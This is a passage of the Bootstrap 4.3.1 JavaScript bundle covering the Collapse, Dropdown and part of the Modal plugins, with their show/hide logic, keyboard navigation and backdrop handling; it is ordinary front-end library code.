        if (this._isTransitioning || $(this._element).hasClass(ClassName$3.SHOW)) {
          return;
        }

        var actives;
        var activesData;

        if (this._parent) {
          actives = [].slice.call(this._parent.querySelectorAll(Selector$3.ACTIVES)).filter(function (elem) {
            if (typeof _this._config.parent === 'string') {
              return elem.getAttribute('data-parent') === _this._config.parent;
            }

            return elem.classList.contains(ClassName$3.COLLAPSE);
          });

          if (actives.length === 0) {
            actives = null;
          }
        }

        if (actives) {
          activesData = $(actives).not(this._selector).data(DATA_KEY$3);

          if (activesData && activesData._isTransitioning) {
            return;
          }
        }

        var startEvent = $.Event(Event$3.SHOW);
        $(this._element).trigger(startEvent);

        if (startEvent.isDefaultPrevented()) {
          return;
        }

        if (actives) {
          Collapse._jQueryInterface.call($(actives).not(this._selector), 'hide');

          if (!activesData) {
            $(actives).data(DATA_KEY$3, null);
          }
        }

        var dimension = this._getDimension();

        $(this._element).removeClass(ClassName$3.COLLAPSE).addClass(ClassName$3.COLLAPSING);
        this._element.style[dimension] = 0;

        if (this._triggerArray.length) {
          $(this._triggerArray).removeClass(ClassName$3.COLLAPSED).attr('aria-expanded', true);
        }

        this.setTransitioning(true);

        var complete = function complete() {
          $(_this._element).removeClass(ClassName$3.COLLAPSING).addClass(ClassName$3.COLLAPSE).addClass(ClassName$3.SHOW);
          _this._element.style[dimension] = '';

          _this.setTransitioning(false);

          $(_this._element).trigger(Event$3.SHOWN);
        };

        var capitalizedDimension = dimension[0].toUpperCase() + dimension.slice(1);
        var scrollSize = "scroll" + capitalizedDimension;
        var transitionDuration = Util.getTransitionDurationFromElement(this._element);
        $(this._element).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
        this._element.style[dimension] = this._element[scrollSize] + "px";
      };

      _proto.hide = function hide() {
        var _this2 = this;

        if (this._isTransitioning || !$(this._element).hasClass(ClassName$3.SHOW)) {
          return;
        }

        var startEvent = $.Event(Event$3.HIDE);
        $(this._element).trigger(startEvent);

        if (startEvent.isDefaultPrevented()) {
          return;
        }

        var dimension = this._getDimension();

        this._element.style[dimension] = this._element.getBoundingClientRect()[dimension] + "px";
        Util.reflow(this._element);
        $(this._element).addClass(ClassName$3.COLLAPSING).removeClass(ClassName$3.COLLAPSE).removeClass(ClassName$3.SHOW);
        var triggerArrayLength = this._triggerArray.length;

        if (triggerArrayLength > 0) {
          for (var i = 0; i < triggerArrayLength; i++) {
            var trigger = this._triggerArray[i];
            var selector = Util.getSelectorFromElement(trigger);

            if (selector !== null) {
              var $elem = $([].slice.call(document.querySelectorAll(selector)));

              if (!$elem.hasClass(ClassName$3.SHOW)) {
                $(trigger).addClass(ClassName$3.COLLAPSED).attr('aria-expanded', false);
              }
            }
          }
        }

        this.setTransitioning(true);

        var complete = function complete() {
          _this2.setTransitioning(false);

          $(_this2._element).removeClass(ClassName$3.COLLAPSING).addClass(ClassName$3.COLLAPSE).trigger(Event$3.HIDDEN);
        };

        this._element.style[dimension] = '';
        var transitionDuration = Util.getTransitionDurationFromElement(this._element);
        $(this._element).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
      };

      _proto.setTransitioning = function setTransitioning(isTransitioning) {
        this._isTransitioning = isTransitioning;
      };

      _proto.dispose = function dispose() {
        $.removeData(this._element, DATA_KEY$3);
        this._config = null;
        this._parent = null;
        this._element = null;
        this._triggerArray = null;
        this._isTransitioning = null;
      } // Private
        ;

      _proto._getConfig = function _getConfig(config) {
        config = _objectSpread({}, Default$1, config);
        config.toggle = Boolean(config.toggle); // Coerce string values

        Util.typeCheckConfig(NAME$3, config, DefaultType$1);
        return config;
      };

      _proto._getDimension = function _getDimension() {
        var hasWidth = $(this._element).hasClass(Dimension.WIDTH);
        return hasWidth ? Dimension.WIDTH : Dimension.HEIGHT;
      };

      _proto._getParent = function _getParent() {
        var _this3 = this;

        var parent;

        if (Util.isElement(this._config.parent)) {
          parent = this._config.parent; // It's a jQuery object

          if (typeof this._config.parent.jquery !== 'undefined') {
            parent = this._config.parent[0];
          }
        } else {
          parent = document.querySelector(this._config.parent);
        }

        var selector = "[data-toggle=\"collapse\"][data-parent=\"" + this._config.parent + "\"]";
        var children = [].slice.call(parent.querySelectorAll(selector));
        $(children).each(function (i, element) {
          _this3._addAriaAndCollapsedClass(Collapse._getTargetFromElement(element), [element]);
        });
        return parent;
      };

      _proto._addAriaAndCollapsedClass = function _addAriaAndCollapsedClass(element, triggerArray) {
        var isOpen = $(element).hasClass(ClassName$3.SHOW);

        if (triggerArray.length) {
          $(triggerArray).toggleClass(ClassName$3.COLLAPSED, !isOpen).attr('aria-expanded', isOpen);
        }
      } // Static
        ;

      Collapse._getTargetFromElement = function _getTargetFromElement(element) {
        var selector = Util.getSelectorFromElement(element);
        return selector ? document.querySelector(selector) : null;
      };

      Collapse._jQueryInterface = function _jQueryInterface(config) {
        return this.each(function () {
          var $this = $(this);
          var data = $this.data(DATA_KEY$3);

          var _config = _objectSpread({}, Default$1, $this.data(), typeof config === 'object' && config ? config : {});

          if (!data && _config.toggle && /show|hide/.test(config)) {
            _config.toggle = false;
          }

          if (!data) {
            data = new Collapse(this, _config);
            $this.data(DATA_KEY$3, data);
          }

          if (typeof config === 'string') {
            if (typeof data[config] === 'undefined') {
              throw new TypeError("No method named \"" + config + "\"");
            }

            data[config]();
          }
        });
      };

      _createClass(Collapse, null, [{
        key: "VERSION",
        get: function get() {
          return VERSION$3;
        }
      }, {
        key: "Default",
        get: function get() {
          return Default$1;
        }
      }]);

      return Collapse;
    }();
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  $(document).on(Event$3.CLICK_DATA_API, Selector$3.DATA_TOGGLE, function (event) {
    // preventDefault only for <a> elements (which change the URL) not inside the collapsible element
    if (event.currentTarget.tagName === 'A') {
      event.preventDefault();
    }

    var $trigger = $(this);
    var selector = Util.getSelectorFromElement(this);
    var selectors = [].slice.call(document.querySelectorAll(selector));
    $(selectors).each(function () {
      var $target = $(this);
      var data = $target.data(DATA_KEY$3);
      var config = data ? 'toggle' : $trigger.data();

      Collapse._jQueryInterface.call($target, config);
    });
  });
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */

  $.fn[NAME$3] = Collapse._jQueryInterface;
  $.fn[NAME$3].Constructor = Collapse;

  $.fn[NAME$3].noConflict = function () {
    $.fn[NAME$3] = JQUERY_NO_CONFLICT$3;
    return Collapse._jQueryInterface;
  };

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAME$4 = 'dropdown';
  var VERSION$4 = '4.3.1';
  var DATA_KEY$4 = 'bs.dropdown';
  var EVENT_KEY$4 = "." + DATA_KEY$4;
  var DATA_API_KEY$4 = '.data-api';
  var JQUERY_NO_CONFLICT$4 = $.fn[NAME$4];
  var ESCAPE_KEYCODE = 27; // KeyboardEvent.which value for Escape (Esc) key

  var SPACE_KEYCODE = 32; // KeyboardEvent.which value for space key

  var TAB_KEYCODE = 9; // KeyboardEvent.which value for tab key

  var ARROW_UP_KEYCODE = 38; // KeyboardEvent.which value for up arrow key

  var ARROW_DOWN_KEYCODE = 40; // KeyboardEvent.which value for down arrow key

  var RIGHT_MOUSE_BUTTON_WHICH = 3; // MouseEvent.which value for the right button (assuming a right-handed mouse)

  var REGEXP_KEYDOWN = new RegExp(ARROW_UP_KEYCODE + "|" + ARROW_DOWN_KEYCODE + "|" + ESCAPE_KEYCODE);
  var Event$4 = {
    HIDE: "hide" + EVENT_KEY$4,
    HIDDEN: "hidden" + EVENT_KEY$4,
    SHOW: "show" + EVENT_KEY$4,
    SHOWN: "shown" + EVENT_KEY$4,
    CLICK: "click" + EVENT_KEY$4,
    CLICK_DATA_API: "click" + EVENT_KEY$4 + DATA_API_KEY$4,
    KEYDOWN_DATA_API: "keydown" + EVENT_KEY$4 + DATA_API_KEY$4,
    KEYUP_DATA_API: "keyup" + EVENT_KEY$4 + DATA_API_KEY$4
  };
  var ClassName$4 = {
    DISABLED: 'disabled',
    SHOW: 'show',
    DROPUP: 'dropup',
    DROPRIGHT: 'dropright',
    DROPLEFT: 'dropleft',
    MENURIGHT: 'dropdown-menu-right',
    MENULEFT: 'dropdown-menu-left',
    POSITION_STATIC: 'position-static'
  };
  var Selector$4 = {
    DATA_TOGGLE: '[data-toggle="dropdown"]',
    FORM_CHILD: '.dropdown form',
    MENU: '.dropdown-menu',
    NAVBAR_NAV: '.navbar-nav',
    VISIBLE_ITEMS: '.dropdown-menu .dropdown-item:not(.disabled):not(:disabled)'
  };
  var AttachmentMap = {
    TOP: 'top-start',
    TOPEND: 'top-end',
    BOTTOM: 'bottom-start',
    BOTTOMEND: 'bottom-end',
    RIGHT: 'right-start',
    RIGHTEND: 'right-end',
    LEFT: 'left-start',
    LEFTEND: 'left-end'
  };
  var Default$2 = {
    offset: 0,
    flip: true,
    boundary: 'scrollParent',
    reference: 'toggle',
    display: 'dynamic'
  };
  var DefaultType$2 = {
    offset: '(number|string|function)',
    flip: 'boolean',
    boundary: '(string|element)',
    reference: '(string|element)',
    display: 'string'
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var Dropdown =
    /*#__PURE__*/
    function () {
      function Dropdown(element, config) {
        this._element = element;
        this._popper = null;
        this._config = this._getConfig(config);
        this._menu = this._getMenuElement();
        this._inNavbar = this._detectNavbar();

        this._addEventListeners();
      } // Getters


      var _proto = Dropdown.prototype;

      // Public
      _proto.toggle = function toggle() {
        if (this._element.disabled || $(this._element).hasClass(ClassName$4.DISABLED)) {
          return;
        }

        var parent = Dropdown._getParentFromElement(this._element);

        var isActive = $(this._menu).hasClass(ClassName$4.SHOW);

        Dropdown._clearMenus();

        if (isActive) {
          return;
        }

        var relatedTarget = {
          relatedTarget: this._element
        };
        var showEvent = $.Event(Event$4.SHOW, relatedTarget);
        $(parent).trigger(showEvent);

        if (showEvent.isDefaultPrevented()) {
          return;
        } // Disable totally Popper.js for Dropdown in Navbar


        if (!this._inNavbar) {
          /**
           * Check for Popper dependency
           * Popper - https://popper.js.org
           */
          if (typeof Popper === 'undefined') {
            throw new TypeError('Bootstrap\'s dropdowns require Popper.js (https://popper.js.org/)');
          }

          var referenceElement = this._element;

          if (this._config.reference === 'parent') {
            referenceElement = parent;
          } else if (Util.isElement(this._config.reference)) {
            referenceElement = this._config.reference; // Check if it's jQuery element

            if (typeof this._config.reference.jquery !== 'undefined') {
              referenceElement = this._config.reference[0];
            }
          } // If boundary is not `scrollParent`, then set position to `static`
          // to allow the menu to "escape" the scroll parent's boundaries
          // https://github.com/twbs/bootstrap/issues/24251


          if (this._config.boundary !== 'scrollParent') {
            $(parent).addClass(ClassName$4.POSITION_STATIC);
          }

          this._popper = new Popper(referenceElement, this._menu, this._getPopperConfig());
        } // If this is a touch-enabled device we add extra
        // empty mouseover listeners to the body's immediate children;
        // only needed because of broken event delegation on iOS
        // https://www.quirksmode.org/blog/archives/2014/02/mouse_event_bub.html


        if ('ontouchstart' in document.documentElement && $(parent).closest(Selector$4.NAVBAR_NAV).length === 0) {
          $(document.body).children().on('mouseover', null, $.noop);
        }

        this._element.focus();

        this._element.setAttribute('aria-expanded', true);

        $(this._menu).toggleClass(ClassName$4.SHOW);
        $(parent).toggleClass(ClassName$4.SHOW).trigger($.Event(Event$4.SHOWN, relatedTarget));
      };

      _proto.show = function show() {
        if (this._element.disabled || $(this._element).hasClass(ClassName$4.DISABLED) || $(this._menu).hasClass(ClassName$4.SHOW)) {
          return;
        }

        var relatedTarget = {
          relatedTarget: this._element
        };
        var showEvent = $.Event(Event$4.SHOW, relatedTarget);

        var parent = Dropdown._getParentFromElement(this._element);

        $(parent).trigger(showEvent);

        if (showEvent.isDefaultPrevented()) {
          return;
        }

        $(this._menu).toggleClass(ClassName$4.SHOW);
        $(parent).toggleClass(ClassName$4.SHOW).trigger($.Event(Event$4.SHOWN, relatedTarget));
      };

      _proto.hide = function hide() {
        if (this._element.disabled || $(this._element).hasClass(ClassName$4.DISABLED) || !$(this._menu).hasClass(ClassName$4.SHOW)) {
          return;
        }

        var relatedTarget = {
          relatedTarget: this._element
        };
        var hideEvent = $.Event(Event$4.HIDE, relatedTarget);

        var parent = Dropdown._getParentFromElement(this._element);

        $(parent).trigger(hideEvent);

        if (hideEvent.isDefaultPrevented()) {
          return;
        }

        $(this._menu).toggleClass(ClassName$4.SHOW);
        $(parent).toggleClass(ClassName$4.SHOW).trigger($.Event(Event$4.HIDDEN, relatedTarget));
      };

      _proto.dispose = function dispose() {
        $.removeData(this._element, DATA_KEY$4);
        $(this._element).off(EVENT_KEY$4);
        this._element = null;
        this._menu = null;

        if (this._popper !== null) {
          this._popper.destroy();

          this._popper = null;
        }
      };

      _proto.update = function update() {
        this._inNavbar = this._detectNavbar();

        if (this._popper !== null) {
          this._popper.scheduleUpdate();
        }
      } // Private
        ;

      _proto._addEventListeners = function _addEventListeners() {
        var _this = this;

        $(this._element).on(Event$4.CLICK, function (event) {
          event.preventDefault();
          event.stopPropagation();

          _this.toggle();
        });
      };

      _proto._getConfig = function _getConfig(config) {
        config = _objectSpread({}, this.constructor.Default, $(this._element).data(), config);
        Util.typeCheckConfig(NAME$4, config, this.constructor.DefaultType);
        return config;
      };

      _proto._getMenuElement = function _getMenuElement() {
        if (!this._menu) {
          var parent = Dropdown._getParentFromElement(this._element);

          if (parent) {
            this._menu = parent.querySelector(Selector$4.MENU);
          }
        }

        return this._menu;
      };

      _proto._getPlacement = function _getPlacement() {
        var $parentDropdown = $(this._element.parentNode);
        var placement = AttachmentMap.BOTTOM; // Handle dropup

        if ($parentDropdown.hasClass(ClassName$4.DROPUP)) {
          placement = AttachmentMap.TOP;

          if ($(this._menu).hasClass(ClassName$4.MENURIGHT)) {
            placement = AttachmentMap.TOPEND;
          }
        } else if ($parentDropdown.hasClass(ClassName$4.DROPRIGHT)) {
          placement = AttachmentMap.RIGHT;
        } else if ($parentDropdown.hasClass(ClassName$4.DROPLEFT)) {
          placement = AttachmentMap.LEFT;
        } else if ($(this._menu).hasClass(ClassName$4.MENURIGHT)) {
          placement = AttachmentMap.BOTTOMEND;
        }

        return placement;
      };

      _proto._detectNavbar = function _detectNavbar() {
        return $(this._element).closest('.navbar').length > 0;
      };

      _proto._getOffset = function _getOffset() {
        var _this2 = this;

        var offset = {};

        if (typeof this._config.offset === 'function') {
          offset.fn = function (data) {
            data.offsets = _objectSpread({}, data.offsets, _this2._config.offset(data.offsets, _this2._element) || {});
            return data;
          };
        } else {
          offset.offset = this._config.offset;
        }

        return offset;
      };

      _proto._getPopperConfig = function _getPopperConfig() {
        var popperConfig = {
          placement: this._getPlacement(),
          modifiers: {
            offset: this._getOffset(),
            flip: {
              enabled: this._config.flip
            },
            preventOverflow: {
              boundariesElement: this._config.boundary
            }
          } // Disable Popper.js if we have a static display

        };

        if (this._config.display === 'static') {
          popperConfig.modifiers.applyStyle = {
            enabled: false
          };
        }

        return popperConfig;
      } // Static
        ;

      Dropdown._jQueryInterface = function _jQueryInterface(config) {
        return this.each(function () {
          var data = $(this).data(DATA_KEY$4);

          var _config = typeof config === 'object' ? config : null;

          if (!data) {
            data = new Dropdown(this, _config);
            $(this).data(DATA_KEY$4, data);
          }

          if (typeof config === 'string') {
            if (typeof data[config] === 'undefined') {
              throw new TypeError("No method named \"" + config + "\"");
            }

            data[config]();
          }
        });
      };

      Dropdown._clearMenus = function _clearMenus(event) {
        if (event && (event.which === RIGHT_MOUSE_BUTTON_WHICH || event.type === 'keyup' && event.which !== TAB_KEYCODE)) {
          return;
        }

        var toggles = [].slice.call(document.querySelectorAll(Selector$4.DATA_TOGGLE));

        for (var i = 0, len = toggles.length; i < len; i++) {
          var parent = Dropdown._getParentFromElement(toggles[i]);

          var context = $(toggles[i]).data(DATA_KEY$4);
          var relatedTarget = {
            relatedTarget: toggles[i]
          };

          if (event && event.type === 'click') {
            relatedTarget.clickEvent = event;
          }

          if (!context) {
            continue;
          }

          var dropdownMenu = context._menu;

          if (!$(parent).hasClass(ClassName$4.SHOW)) {
            continue;
          }

          if (event && (event.type === 'click' && /input|textarea/i.test(event.target.tagName) || event.type === 'keyup' && event.which === TAB_KEYCODE) && $.contains(parent, event.target)) {
            continue;
          }

          var hideEvent = $.Event(Event$4.HIDE, relatedTarget);
          $(parent).trigger(hideEvent);

          if (hideEvent.isDefaultPrevented()) {
            continue;
          } // If this is a touch-enabled device we remove the extra
          // empty mouseover listeners we added for iOS support


          if ('ontouchstart' in document.documentElement) {
            $(document.body).children().off('mouseover', null, $.noop);
          }

          toggles[i].setAttribute('aria-expanded', 'false');
          $(dropdownMenu).removeClass(ClassName$4.SHOW);
          $(parent).removeClass(ClassName$4.SHOW).trigger($.Event(Event$4.HIDDEN, relatedTarget));
        }
      };

      Dropdown._getParentFromElement = function _getParentFromElement(element) {
        var parent;
        var selector = Util.getSelectorFromElement(element);

        if (selector) {
          parent = document.querySelector(selector);
        }

        return parent || element.parentNode;
      } // eslint-disable-next-line complexity
        ;

      Dropdown._dataApiKeydownHandler = function _dataApiKeydownHandler(event) {
        // If not input/textarea:
        //  - And not a key in REGEXP_KEYDOWN => not a dropdown command
        // If input/textarea:
        //  - If space key => not a dropdown command
        //  - If key is other than escape
        //    - If key is not up or down => not a dropdown command
        //    - If trigger inside the menu => not a dropdown command
        if (/input|textarea/i.test(event.target.tagName) ? event.which === SPACE_KEYCODE || event.which !== ESCAPE_KEYCODE && (event.which !== ARROW_DOWN_KEYCODE && event.which !== ARROW_UP_KEYCODE || $(event.target).closest(Selector$4.MENU).length) : !REGEXP_KEYDOWN.test(event.which)) {
          return;
        }

        event.preventDefault();
        event.stopPropagation();

        if (this.disabled || $(this).hasClass(ClassName$4.DISABLED)) {
          return;
        }

        var parent = Dropdown._getParentFromElement(this);

        var isActive = $(parent).hasClass(ClassName$4.SHOW);

        if (!isActive || isActive && (event.which === ESCAPE_KEYCODE || event.which === SPACE_KEYCODE)) {
          if (event.which === ESCAPE_KEYCODE) {
            var toggle = parent.querySelector(Selector$4.DATA_TOGGLE);
            $(toggle).trigger('focus');
          }

          $(this).trigger('click');
          return;
        }

        var items = [].slice.call(parent.querySelectorAll(Selector$4.VISIBLE_ITEMS));

        if (items.length === 0) {
          return;
        }

        var index = items.indexOf(event.target);

        if (event.which === ARROW_UP_KEYCODE && index > 0) {
          // Up
          index--;
        }

        if (event.which === ARROW_DOWN_KEYCODE && index < items.length - 1) {
          // Down
          index++;
        }

        if (index < 0) {
          index = 0;
        }

        items[index].focus();
      };

      _createClass(Dropdown, null, [{
        key: "VERSION",
        get: function get() {
          return VERSION$4;
        }
      }, {
        key: "Default",
        get: function get() {
          return Default$2;
        }
      }, {
        key: "DefaultType",
        get: function get() {
          return DefaultType$2;
        }
      }]);

      return Dropdown;
    }();
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  $(document).on(Event$4.KEYDOWN_DATA_API, Selector$4.DATA_TOGGLE, Dropdown._dataApiKeydownHandler).on(Event$4.KEYDOWN_DATA_API, Selector$4.MENU, Dropdown._dataApiKeydownHandler).on(Event$4.CLICK_DATA_API + " " + Event$4.KEYUP_DATA_API, Dropdown._clearMenus).on(Event$4.CLICK_DATA_API, Selector$4.DATA_TOGGLE, function (event) {
    event.preventDefault();
    event.stopPropagation();

    Dropdown._jQueryInterface.call($(this), 'toggle');
  }).on(Event$4.CLICK_DATA_API, Selector$4.FORM_CHILD, function (e) {
    e.stopPropagation();
  });
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */

  $.fn[NAME$4] = Dropdown._jQueryInterface;
  $.fn[NAME$4].Constructor = Dropdown;

  $.fn[NAME$4].noConflict = function () {
    $.fn[NAME$4] = JQUERY_NO_CONFLICT$4;
    return Dropdown._jQueryInterface;
  };

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAME$5 = 'modal';
  var VERSION$5 = '4.3.1';
  var DATA_KEY$5 = 'bs.modal';
  var EVENT_KEY$5 = "." + DATA_KEY$5;
  var DATA_API_KEY$5 = '.data-api';
  var JQUERY_NO_CONFLICT$5 = $.fn[NAME$5];
  var ESCAPE_KEYCODE$1 = 27; // KeyboardEvent.which value for Escape (Esc) key

  var Default$3 = {
    backdrop: true,
    keyboard: true,
    focus: true,
    show: true
  };
  var DefaultType$3 = {
    backdrop: '(boolean|string)',
    keyboard: 'boolean',
    focus: 'boolean',
    show: 'boolean'
  };
  var Event$5 = {
    HIDE: "hide" + EVENT_KEY$5,
    HIDDEN: "hidden" + EVENT_KEY$5,
    SHOW: "show" + EVENT_KEY$5,
    SHOWN: "shown" + EVENT_KEY$5,
    FOCUSIN: "focusin" + EVENT_KEY$5,
    RESIZE: "resize" + EVENT_KEY$5,
    CLICK_DISMISS: "click.dismiss" + EVENT_KEY$5,
    KEYDOWN_DISMISS: "keydown.dismiss" + EVENT_KEY$5,
    MOUSEUP_DISMISS: "mouseup.dismiss" + EVENT_KEY$5,
    MOUSEDOWN_DISMISS: "mousedown.dismiss" + EVENT_KEY$5,
    CLICK_DATA_API: "click" + EVENT_KEY$5 + DATA_API_KEY$5
  };
  var ClassName$5 = {
    SCROLLABLE: 'modal-dialog-scrollable',
    SCROLLBAR_MEASURER: 'modal-scrollbar-measure',
    BACKDROP: 'modal-backdrop',
    OPEN: 'modal-open',
    FADE: 'fade',
    SHOW: 'show'
  };
  var Selector$5 = {
    DIALOG: '.modal-dialog',
    MODAL_BODY: '.modal-body',
    DATA_TOGGLE: '[data-toggle="modal"]',
    DATA_DISMISS: '[data-dismiss="modal"]',
    FIXED_CONTENT: '.fixed-top, .fixed-bottom, .is-fixed, .sticky-top',
    STICKY_CONTENT: '.sticky-top'
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var Modal =
    /*#__PURE__*/
    function () {
      function Modal(element, config) {
        this._config = this._getConfig(config);
        this._element = element;
        this._dialog = element.querySelector(Selector$5.DIALOG);
        this._backdrop = null;
        this._isShown = false;
        this._isBodyOverflowing = false;
        this._ignoreBackdropClick = false;
        this._isTransitioning = false;
        this._scrollbarWidth = 0;
      } // Getters


      var _proto = Modal.prototype;

      // Public
      _proto.toggle = function toggle(relatedTarget) {
        return this._isShown ? this.hide() : this.show(relatedTarget);
      };

      _proto.show = function show(relatedTarget) {
        var _this = this;

        if (this._isShown || this._isTransitioning) {
          return;
        }

        if ($(this._element).hasClass(ClassName$5.FADE)) {
          this._isTransitioning = true;
        }

        var showEvent = $.Event(Event$5.SHOW, {
          relatedTarget: relatedTarget
        });
        $(this._element).trigger(showEvent);

        if (this._isShown || showEvent.isDefaultPrevented()) {
          return;
        }

        this._isShown = true;

        this._checkScrollbar();

        this._setScrollbar();

        this._adjustDialog();

        this._setEscapeEvent();

        this._setResizeEvent();

        $(this._element).on(Event$5.CLICK_DISMISS, Selector$5.DATA_DISMISS, function (event) {
          return _this.hide(event);
        });
        $(this._dialog).on(Event$5.MOUSEDOWN_DISMISS, function () {
          $(_this._element).one(Event$5.MOUSEUP_DISMISS, function (event) {
            if ($(event.target).is(_this._element)) {
              _this._ignoreBackdropClick = true;
            }
          });
        });

        this._showBackdrop(function () {
          return _this._showElement(relatedTarget);
        });
      };

      _proto.hide = function hide(event) {
        var _this2 = this;

        if (event) {
          event.preventDefault();
        }

        if (!this._isShown || this._isTransitioning) {
          return;
        }

        var hideEvent = $.Event(Event$5.HIDE);
        $(this._element).trigger(hideEvent);

        if (!this._isShown || hideEvent.isDefaultPrevented()) {
          return;
        }

        this._isShown = false;
        var transition = $(this._element).hasClass(ClassName$5.FADE);

        if (transition) {
          this._isTransitioning = true;
        }

        this._setEscapeEvent();

        this._setResizeEvent();

        $(document).off(Event$5.FOCUSIN);
        $(this._element).removeClass(ClassName$5.SHOW);
        $(this._element).off(Event$5.CLICK_DISMISS);
        $(this._dialog).off(Event$5.MOUSEDOWN_DISMISS);

        if (transition) {
          var transitionDuration = Util.getTransitionDurationFromElement(this._element);
          $(this._element).one(Util.TRANSITION_END, function (event) {
            return _this2._hideModal(event);
          }).emulateTransitionEnd(transitionDuration);
        } else {
          this._hideModal();
        }
      };

      _proto.dispose = function dispose() {
        [window, this._element, this._dialog].forEach(function (htmlElement) {
          return $(htmlElement).off(EVENT_KEY$5);
        });
        /**
         * `document` has 2 events `Event.FOCUSIN` and `Event.CLICK_DATA_API`
         * Do not move `document` in `htmlElements` array
         * It will remove `Event.CLICK_DATA_API` event that should remain
         */

        $(document).off(Event$5.FOCUSIN);
        $.removeData(this._element, DATA_KEY$5);
        this._config = null;
        this._element = null;
        this._dialog = null;
        this._backdrop = null;
        this._isShown = null;
        this._isBodyOverflowing = null;
        this._ignoreBackdropClick = null;
        this._isTransitioning = null;
        this._scrollbarWidth = null;
      };

      _proto.handleUpdate = function handleUpdate() {
        this._adjustDialog();
      } // Private
        ;

      _proto._getConfig = function _getConfig(config) {
        config = _objectSpread({}, Default$3, config);
        Util.typeCheckConfig(NAME$5, config, DefaultType$3);
        return config;
      };

      _proto._showElement = function _showElement(relatedTarget) {
        var _this3 = this;

        var transition = $(this._element).hasClass(ClassName$5.FADE);

        if (!this._element.parentNode || this._element.parentNode.nodeType !== Node.ELEMENT_NODE) {
          // Don't move modal's DOM position
          document.body.appendChild(this._element);
        }

        this._element.style.display = 'block';

        this._element.removeAttribute('aria-hidden');

        this._element.setAttribute('aria-modal', true);

        if ($(this._dialog).hasClass(ClassName$5.SCROLLABLE)) {
          this._dialog.querySelector(Selector$5.MODAL_BODY).scrollTop = 0;
        } else {
          this._element.scrollTop = 0;
        }

        if (transition) {
          Util.reflow(this._element);
        }

        $(this._element).addClass(ClassName$5.SHOW);

        if (this._config.focus) {
          this._enforceFocus();
        }

        var shownEvent = $.Event(Event$5.SHOWN, {
          relatedTarget: relatedTarget
        });

        var transitionComplete = function transitionComplete() {
          if (_this3._config.focus) {
            _this3._element.focus();
          }

          _this3._isTransitioning = false;
          $(_this3._element).trigger(shownEvent);
        };

        if (transition) {
          var transitionDuration = Util.getTransitionDurationFromElement(this._dialog);
          $(this._dialog).one(Util.TRANSITION_END, transitionComplete).emulateTransitionEnd(transitionDuration);
        } else {
          transitionComplete();
        }
      };

      _proto._enforceFocus = function _enforceFocus() {
        var _this4 = this;

        $(document).off(Event$5.FOCUSIN) // Guard against infinite focus loop
          .on(Event$5.FOCUSIN, function (event) {
            if (document !== event.target && _this4._element !== event.target && $(_this4._element).has(event.target).length === 0) {
              _this4._element.focus();
            }
          });
      };

      _proto._setEscapeEvent = function _setEscapeEvent() {
        var _this5 = this;

        if (this._isShown && this._config.keyboard) {
          $(this._element).on(Event$5.KEYDOWN_DISMISS, function (event) {
            if (event.which === ESCAPE_KEYCODE$1) {
              event.preventDefault();

              _this5.hide();
            }
          });
        } else if (!this._isShown) {
          $(this._element).off(Event$5.KEYDOWN_DISMISS);
        }
      };

      _proto._setResizeEvent = function _setResizeEvent() {
        var _this6 = this;

        if (this._isShown) {
          $(window).on(Event$5.RESIZE, function (event) {
            return _this6.handleUpdate(event);
          });
        } else {
          $(window).off(Event$5.RESIZE);
        }
      };

      _proto._hideModal = function _hideModal() {
        var _this7 = this;

        this._element.style.display = 'none';

        this._element.setAttribute('aria-hidden', true);

        this._element.removeAttribute('aria-modal');

        this._isTransitioning = false;

        this._showBackdrop(function () {
          $(document.body).removeClass(ClassName$5.OPEN);

          _this7._resetAdjustments();

          _this7._resetScrollbar();

          $(_this7._element).trigger(Event$5.HIDDEN);
        });
      };

      _proto._removeBackdrop = function _removeBackdrop() {
        if (this._backdrop) {
          $(this._backdrop).remove();
          this._backdrop = null;
        }
      };

      _proto._showBackdrop = function _showBackdrop(callback) {
        var _this8 = this;

        var animate = $(this._element).hasClass(ClassName$5.FADE) ? ClassName$5.FADE : '';

        if (this._isShown && this._config.backdrop) {
          this._backdrop = document.createElement('div');
          this._backdrop.className = ClassName$5.BACKDROP;

          if (animate) {
            this._backdrop.classList.add(animate);
          }

          $(this._backdrop).appendTo(document.body);
          $(this._element).on(Event$5.CLICK_DISMISS, function (event) {
            if (_this8._ignoreBackdropClick) {
              _this8._ignoreBackdropClick = false;
              return;
            }

            if (event.target !== event.currentTarget) {
              return;
            }

            if (_this8._config.backdrop === 'static') {
              _this8._element.focus();
            } else {
              _this8.hide();
            }
          });

          if (animate) {
            Util.reflow(this._backdrop);
          }

          $(this._backdrop).addClass(ClassName$5.SHOW);

          if (!callback) {
            return;
          }

          if (!animate) {
            callback();
            return;
          }

          var backdropTransitionDuration = Util.getTransitionDurationFromElement(this._backdrop);
          $(this._backdrop).one(Util.TRANSITION_END, callback).emulateTransitionEnd(backdropTransitionDuration);
        } else if (!this._isShown && this._backdrop) {
          $(this._backdrop).removeClass(ClassName$5.SHOW);

          var callbackRemove = function callbackRemove() {
            _this8._removeBackdrop();

            if (callback) {
              callback();
            }
          };

          if ($(this._element).hasClass(ClassName$5.FADE)) {
            var _backdropTransitionDuration = Util.getTransitionDurationFromElement(this._backdrop);

            $(this._backdrop).one(Util.TRANSITION_END, callbackRemove).emulateTransitionEnd(_backdropTransitionDuration);
          } else {
            callbackRemove();
          }
        } else if (callback) {
          callback();
        }
      } // ----------------------------------------------------------------------
        // the following methods are used to handle overflowing modals
        // todo (fat): these should probably be refactored out of modal.js
        // ----------------------------------------------------------------------
        ;

      _proto._adjustDialog = function _adjustDialog() {
        var isModalOverflowing = this._element.scrollHeight > document.documentElement.clientHeight;

        if (!this._isBodyOverflowing && isModalOverflowing) {
          this._element.style.paddingLeft = this._scrollbarWidth + "px";
        }

